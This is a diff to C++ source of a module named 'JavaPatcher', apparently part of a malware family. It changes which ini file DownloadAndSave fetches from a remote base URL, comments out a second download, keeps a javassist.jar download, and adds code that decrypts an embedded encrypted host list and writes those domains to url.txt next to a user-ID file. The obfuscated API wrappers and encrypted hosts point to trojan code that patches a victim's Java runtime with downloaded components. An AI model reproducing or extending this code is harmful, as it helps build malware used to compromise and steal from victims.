@@ -563,18 +563,18 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 	}
 
 	string azUser = GetAzUser();
-	DBG( "JavaPatcher",  "AzUser: %s", azUser.t_str() );
+//	DBG( "JavaPatcher",  "AzUser: %s", azUser.t_str() );
 
-	m_lstrcpy( fileName, azUser.t_str() );
-	m_lstrcat( fileName, "_rt.ini" );
-	addUrl = fileName;
+//	m_lstrcpy( fileName, azUser.t_str() );
+//	m_lstrcat( fileName, "_rt.ini" );
+	addUrl = "rt.ini"; //fileName;
 	crcName = addUrl;
 	m_lstrcpy( iniFilePath, Path );
 	pPathAppendA( iniFilePath, "rt.ini" );
 	//File::GetTempName(iniFilePath);
 	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, iniFilePath, crcName ) )
 		return false;
-
+/*
 	m_lstrcpy( fileName, azUser.t_str() );
 	m_lstrcat( fileName, "_rt_p.ini" );
 	addUrl = fileName;
@@ -584,7 +584,7 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 //	File::GetTempName(iniFilePath2);
 	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, iniFilePath2, crcName ) )
 		return false;
-
+*/
 
 	addUrl = "javassist.jar";
 	crcName = addUrl;
@@ -606,6 +606,21 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 	m_lstrcpy( fileName, Path );
 	pPathAppendA( fileName, "user.txt" );
 	File::WriteBufferA( fileName, azUser.t_str(), azUser.Length() );
+
+	//сохраняем домены
+	char* mem = (char*)HEAP::Alloc(1024);
+	*mem = 0;
+	TStrEnum E( Rafa::Hosts(), RAFAHOSTS_PARAM_ENCRYPTED, 0x86D19DC3 /* __RAFA_HOSTS__ */ );
+	
+	while( E.Next() )
+	{
+		m_lstrcat( mem, E.Line().t_str() );
+		m_lstrcat( mem, "\r\n" );
+	}
+	m_lstrcpy( fileName, Path );
+	pPathAppendA( fileName, "url.txt" );
+	File::WriteBufferA( fileName, mem, m_lstrlen(mem) );
+	HEAP::Free(mem);
 
 	return true;
 }
